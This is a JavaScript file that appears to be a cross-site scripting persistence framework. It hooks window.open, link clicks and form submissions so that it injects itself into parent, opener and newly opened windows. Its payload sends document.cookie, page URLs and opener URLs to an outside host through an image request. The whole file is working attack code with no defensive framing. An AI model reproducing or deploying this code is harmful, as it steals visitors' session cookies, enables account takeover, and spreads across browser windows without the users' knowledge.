var XG = function () {
    function a(p, s, q, g) {
        var d = this;
        d.addEventListener("error", function (v) {
        });
        q = q.concat();
        function f(y, x, v) {
            x = "(" + x + ").apply(this,arguments)";
            if (!y.Function) {
                return false
            }
            var w = y.Function(x);
            w.apply(null, v || []);
            return true
        }

        var l = d.open;
        d.open = function (v) {
            var w = l.apply(this, arguments);
            if (w) {
                if (!v || /about:blank/i.test(v)) {
                    w.__xss_blank = true
                }
                t(w)
            }
            return w
        };
        function j(w) {
            var v = w.target;
            do {
                if (v.tagName == "A") {
                    return v
                }
                v = v.parentNode
            } while (v != document)
        }

        function k(w) {
            if (w.defaultPrevented) {
                return
            }
            var v = j(w);
            if (!v) {
                return
            }
            if (!/http|about/.test(v.protocol)) {
                return
            }
            w.preventDefault();
            open(v.href)
        }

        function m(y) {
            if (y.defaultPrevented) {
                return
            }
            var v = "$" + Math.random();
            var x = open("", v);
            var w = y.target;
            w.target = v
        }

        function c(v) {
            h(function (w) {
                var x;
                try {
                    x = w.__xss_notify
                } catch (y) {
                }
                if (x) {
                    x(v)
                }
            })
        }

        d.__xss_notify = function (w) {
            var v;
            h(function (x) {
                if (x == w) {
                    v = true;
                    return false
                }
            });
            if (!v) {
                q.push(w)
            }
        };
        function e() {
            var v = [];
            h(function (w) {
                if (w != d) {
                    r(w)
                }
                v.push(w)
            });
            q = v
        }

        function h(y) {
            var z;
            try {
                z = q.length
            } catch (x) {
                return
            }
            for (var v = 0; v < z; v++) {
                var w;
                try {
                    w = q[v];
                    if (w.closed) {
                        continue
                    }
                } catch (x) {
                    continue
                }
                if (y(w) === false) {
                    break
                }
            }
        }

        function t(v) {
            c(v);
            r(v)
        }

        function o(v) {
            return v.location.href == "about:blank" && !v.__xss_blank
        }

        function u(w) {
            try {
                return !!w.Function
            } catch (v) {
                return false
            }
        }

        function r(x) {
            if (!u(x)) {
                return
            }
            if (p in x) {
                return
            }
            if (!x.__xss_injected) {
                var w = [p, s, q];
                if (!f(x, a, w)) {
                    return
                }
                x.__xss_injected = true
            }
            if (o(x)) {
                return
            }
            var v = x.__xss_init;
            if (v) {
                v();
                x[p] = true
            }
        }

        d.__xss_init = function () {
            f(d, s);
            setInterval(e, 1000);
            document.addEventListener("click", k);
            document.addEventListener("submit", m)
        };
        d.addEventListener("message", function (v) {
            if (v.data == "bye") {
                v.stopImmediatePropagation();
                e()
            }
        }, true);
        d.addEventListener("unload", function () {
            h(function (w) {
                if (w != d) {
                    try {
                        w.postMessage("bye", "*")
                    } catch (x) {
                    }
                }
            })
        });
        function i() {
            var v = d;
            while (v = v.parent) {
                t(v)
            }
        }

        function n() {
            var w = d;
            for (; ;) {
                try {
                    w = w.opener
                } catch (v) {
                    break
                }
                if (!w) {
                    break
                }
                t(w)
            }
        }

        if (g) {
            __xss_init();
            if (self == top) {
                n()
            } else {
            }
        }
    }

    function b(c) {
        if (!window.addEventListener) {
            return
        }
        var e = "__xss_id_" + c.id;
        if (e in window) {
            return
        }
        window[e] = true;
        var d = c.payload;
        d();
        a(e, d + "", [window], true)
    }

    return {init: b}
}();
XG.init({
    id: 'default', payload: function () {
        function show() {
            (function () {
                (new Image()).src = 'http://blog.pokedex.cn/l.php?id=xxx&location=' + escape((function () {
                    try {
                        return document.location.href
                    } catch (e) {
                        return ''
                    }
                })()) + '&toplocation=' + escape((function () {
                    try {
                        return top.location.href
                    } catch (e) {
                        return ''
                    }
                })()) + '&cookie=' + escape((function () {
                    try {
                        return document.cookie
                    } catch (e) {
                        return ''
                    }
                })()) + '&opener=' + escape((function () {
                    try {
                        return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
                    } catch (e) {
                        return ''
                    }
                })());
            })();
        }

        if (document.body) {
            show();
        } else {
            window.addEventListener('DOMContentLoaded', show);
        }
    }
});
